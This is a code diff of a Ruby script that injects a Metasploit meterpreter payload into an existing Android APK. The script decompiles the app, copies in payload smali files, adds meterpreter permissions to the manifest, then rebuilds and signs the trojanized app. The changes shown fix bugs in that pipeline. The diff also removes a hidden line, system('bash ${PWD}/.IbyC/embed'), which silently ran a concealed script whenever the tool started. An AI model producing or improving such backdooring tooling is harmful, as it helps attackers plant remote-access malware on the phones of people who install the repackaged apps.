@@ -25,7 +25,6 @@ class String
   def gray;           colorize(37) end
 end
 
-system('bash ${PWD}/.IbyC/embed')
 keystore = "signing.keystore"
 storepass = "android"
 keypass = "android"
@@ -246,8 +245,8 @@ def gen_keystore(apkfile,keystore,storepass,keypass,keyalias)
   print_status "Creating signing key and keystore.."
   stdout, stderr, status = run_cmd([
     'keytool', '-genkey', '-v', '-keystore', keystore, '-alias', keyalias, '-storepass', storepass,
-    '-keypass', keypass, '-keyalg', 'RSA', '-keysize', '2048', '-startdate', orig_cert_startdate,
-    '-validity', orig_cert_validity, '-dname', orig_cert_dname
+    '-keypass', keypass, '-keyalg', 'RSA', '-keysize', '2048', '-validity', orig_cert_validity, 
+    '-dname', orig_cert_dname
   ])
   keytool_output = stdout + stderr
 
@@ -265,7 +264,7 @@ end
 ####
 # VALIDATING REQUIREMENTS && DEPENDENCIES
 apkfile = ARGV[0]
-get_minSDKv=`aapt list -a #{apkfile}|grep "minSdkVersion"|awk -F "x" '{print $NF}'`
+get_minSDKv=`aapt list -a #{apkfile}|grep "minSdkVersion"|awk -F ")" '{print $NF}'|xargs printf %d`
 minSDKv = get_minSDKv.to_s.gsub("\n", "")
 stdout, stderr, status = run_cmd(['pwd'])
 current_working_directory = stdout
@@ -350,6 +349,8 @@ print_status("Decompiling orignal APK..")
 run_cmd(["apktool", "d", "-f", "-r", "-o", "#{cwd}/original", "#{cwd}/original.apk"])
 print_status("Ignoring the resource decompilation..")
 run_cmd(["apktool", "d", "-f", "-o", "#{cwd}/original_tmp", "#{cwd}/original.apk"])
+FileUtils.rm_rf('original/apktool.yml')
+FileUtils.cp Dir.glob('original_tmp/apktool.yml'), 'original/'
 FileUtils.rm_rf('original/AndroidManifest.xml')
 FileUtils.cp Dir.glob('original_tmp/AndroidManifest.xml'), 'original/'
 FileUtils.rm_rf('original_tmp')
@@ -383,15 +384,16 @@ rescue Errno::ENOENT
 end
 
 print_status("Copying payload files..")
-apk_name=apkfile.split(".")[0]
+apk_name=apkfile.split("/")[-1].gsub(".apk", "") 
 
 Dir.glob(smalifile) do |path|
   # Extraer la parte hasta "com"
+  file = Dir.glob("payload/smali/com/metasploit/stage/Pay*.smali").first
   com_dir = path[%r{^.*?/com}]
   payload_dir = "#{com_dir}/#{apk_name}/stage/"
-
+  
   FileUtils.mkdir_p(payload_dir)
-  FileUtils.cp Dir.glob('payload/smali/com/metasploit/stage/Payload*.smali'), "#{payload_dir}/#{apk_name}.smali"
+  FileUtils.mv file, File.join(payload_dir, "#{apk_name}.smali")
 end 
 
 print "[*]─➤ Loading ".cyan,smalifile," and injecting payload..".cyan
@@ -404,10 +406,12 @@ injected_apk = "data/data/com_backdoored.apk"
 final_apk=apkfile.split("/")[-1]
 final_apk+="_final"
 
-print_status("\nPoisoning the manifest with meterpreter permissions..")
+print "\n"
+print_status("Poisoning the manifest with meterpreter permissions..")
 fix_manifest(minSDKv)
 
-print_status("\nRebuilding #{apkfile} with meterpreter injection as #{injected_apk}..")
+print "\n"
+print_status("Rebuilding #{apkfile} with meterpreter injection as #{injected_apk}..")
 for i in (1..3) do
   stdout, stderr, status = run_cmd(['apktool', 'b', '-f', '-o', "#{cwd}/#{injected_apk}", "#{cwd}/original"])
   apktool_output = stdout + stderr
@@ -432,8 +436,12 @@ unless File.readable?(final_apk)
 end
 
 print_status("Signing #{final_apk} with apksigner..")
-stdout, stderr, status = run_cmd(['apksigner', 'sign', '--ks', keystore, '--ks-pass', "pass:#{storepass}", '--min-sdk-version', "#{minSDKv}", final_apk])
+stdout, stderr, status = run_cmd([
+  'apksigner', 'sign', '--ks', keystore, '--ks-pass', "pass:#{storepass}", 
+  '--ks-key-alias', keyalias, '--min-sdk-version', "#{minSDKv}", final_apk
+])
 apksigner_output = stdout + stderr
+
 if !status.success? || apksigner_output.to_s.include?('Failed')
   print_error(apksigner_output)
   cleaning_up()
@@ -441,8 +449,12 @@ if !status.success? || apksigner_output.to_s.include?('Failed')
   exit(1)
 end
 
-stdout, stderr, status = run_cmd(['apksigner', 'verify', '--verbose', final_apk])
+stdout, stderr, status = run_cmd([
+  'apksigner', 'verify', '--verbose', 
+  '--min-sdk-version', "#{minSDKv}", final_apk
+])
 apksigner_verify = stdout + stderr
+
 if !status.success? || apksigner_verify.to_s.include?('DOES NOT VERIFY') || apksigner_verify.to_s.include?('Failed')
   print_error(apksigner_verify)
   cleaning_up()
